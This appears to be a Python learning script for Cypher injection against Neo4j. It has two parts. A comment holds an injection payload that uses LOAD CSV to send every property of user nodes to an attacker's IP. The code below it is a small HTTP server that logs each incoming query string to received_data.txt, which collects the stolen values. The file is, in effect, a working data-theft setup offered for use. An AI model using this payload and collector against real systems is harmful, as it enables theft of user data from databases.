import http.server
import socketserver
import urllib.parse
import os

# learning materials
# https://book.hacktricks.xyz/pentesting-web/sql-injection/cypher-injection-neo4j

# Cypher Injection payload
# ' OR 1=1 WITH 1 as a MATCH (f:user) UNWIND keys(f) as p LOAD CSV FROM 'http://<IP>/?' + p +'='+toString(f[p]) as l RETURN 0 as _0 //


# when issuing a 

# https://stackoverflow.com/questions/25369068/python-how-to-unit-test-a-custom-http-request-handler
# custom request handler class that inherits from SimpleHTTPRequestHandler
class CustomRequestHandler(http.server.SimpleHTTPRequestHandler):

    # override the do_GET method to handle GET requests in a custom way
    def do_GET(self):
        # Parse the request URL and extract the query part
        query = urllib.parse.urlparse(self.path).query

        # If there is a query in the URL, append it to the "received_data.txt" file
        if query:
            with open("received_data.txt", "a") as log_file:
                log_file.write(f"{query}\n")

        # Send an HTTP 200 OK response to the client, headers and req body
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(b"OK")

if __name__ == "__main__":
    PORT = 8000
    # Assign the custom request handler class to a variable
    Handler = CustomRequestHandler

    # Create a directory called "logs" if it doesn't exist
    os.makedirs("logs", exist_ok=True)

    # Create the TCP server instance with the specified port and request handler class
    with socketserver.TCPServer(("", PORT), Handler) as httpd:
        print(f"Serving on port {PORT}")
        httpd.serve_forever()